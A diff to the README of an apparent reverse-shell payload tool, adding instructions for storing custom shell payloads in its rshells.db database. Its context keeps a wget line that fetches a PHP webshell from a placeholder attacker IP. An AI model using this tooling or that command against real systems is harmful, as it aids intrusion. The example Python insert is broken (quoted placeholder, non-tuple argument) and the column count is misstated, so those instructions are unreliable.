@@ -27,6 +27,35 @@ wget http://<your ip>:8000/webshell.php
 ```
 This will save the PHP webshell to the attacker machine under the filename: "webshell.php"
 
+## Adding Your Own Shells:
+If you want to add your own shells, you just need to update the `rshells.db` file. 
+
+There are 7 columns that you need to be aware of:
+  - id (unique, autoincrementing)
+  - name (name of the payload)
+  - platform (playform payload runs on)
+  - data (the actual payload)
+  - description (a brief description of the payload)
+  - req_ip (bool; yes if an IP is required in the payload)
+  - req_port (bool; yes if a port is required in the payload)
+  - uid (a unique ID that can be used to reference the payload)
+
+Most of these are self explanatory except for the uid. This should be in the format: `{platform shorthand}{int}` where the shorthand is a simple code for the platform (like 'b' for Bash, "php" for PHP, etc...), and the int is just an incremented value of the previous uid of the same platform.
+
+When adding payloads that require an IP and/or port, make sure you use the strings `^LOCAL_IP^` and `^LOCAL_PORT^` respectively.
+
+We'll use Python to make it easier to add entire file payloads:
+```
+$ python3
+>>> import sqlite3
+>>> db=sqlite3.connect("rshells.db")
+>>> curse=db.cursor()
+#The command below adds a new payload by reading it from a file
+#It also uses a custom IP and PORT, which are TRUE by default and so aren't included
+>>> curse.execute("""INSERT INTO rshells (name,platform,description,data,uid) VALUES ('new name','platform','brief description','?','uid')""",(open("path/to/payload/file",'r').read()))
+>>> db.commit()
+```
+
 ---
 
 ## To-Do:
